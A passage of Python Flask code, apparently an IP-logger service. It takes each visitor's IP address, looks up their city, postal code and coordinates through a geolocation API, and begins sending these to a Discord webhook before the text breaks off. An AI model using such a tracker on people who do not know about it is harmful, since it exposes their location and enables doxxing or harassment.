import requests
from flask import Flask, request, redirect
from datetime import datetime
import os
import redis

app = Flask(__name__)

# Setup Redis
redis_host = os.getenv('REDIS_HOST', 'localhost')  # Use Redis on Render or localhost in development
redis_port = os.getenv('REDIS_PORT', 6379)
redis_client = redis.StrictRedis(host=redis_host, port=redis_port, db=0, decode_responses=True)

# Discord Webhook URL
DISCORD_WEBHOOK_URL = os.getenv("DISCORD_WEBHOOK_URL", "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN")

def get_real_ip():
    """Extract the real IP address from the request"""
    xff = request.headers.get("X-Forwarded-For", "").split(",")
    return xff[0].strip() if xff else request.remote_addr

def get_visitor_info(ip, user_agent):
    """Get geolocation information based on IP"""
    try:
        r = requests.get(f"https://ipapi.co/{ip}/json/", timeout=5)
        
        if r.status_code == 200:
            details = r.json()
        else:
            details = {}
            print(f"API Error: Status Code {r.status_code}")
    except Exception as e:
        details = {}
        print(f"API Error: {e}")

    lat = details.get("latitude", 0)
    lon = details.get("longitude", 0)
    
    return {
        "ip": ip,
        "user_agent": user_agent,
        "country": details.get("country_name", "Unknown"),
        "countryCode": details.get("country_code", "XX").lower(),
        "region": details.get("region", "Unknown"),
        "city": details.get("city", "Unknown"),
        "zip": details.get("postal", "Unknown"),
        "lat": lat,
        "lon": lon,
        "date": datetime.utcnow().strftime("%d/%m/%Y"),
        "time": datetime.utcnow().strftime("%H:%M:%S"),
    }

def send_to_discord(info):
    """Send the information to Discord webhook"""
    embed = {
        "username": "🌍 Visitor Bot",
